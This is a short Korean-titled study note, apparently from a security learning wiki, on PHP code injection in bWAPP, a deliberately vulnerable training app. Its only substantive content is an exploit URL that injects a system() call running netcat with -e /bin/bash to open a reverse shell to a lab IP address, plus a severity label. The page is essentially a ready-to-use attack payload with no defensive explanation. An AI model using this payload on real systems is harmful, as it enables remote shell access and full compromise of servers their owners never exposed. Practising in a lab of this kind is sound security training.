# PHP 코드 인젝션 (PHP Injection)

{% code title="Exploit URL" %}
```
http://192.168.56.122/bWAPP/phpi.php?message=system(%27nc%20192.168.56.102%204444%20-e%20/bin/bash%27)
```
{% endcode %}

{% hint style="warning" %}
Severity: medium/high
{% endhint %}
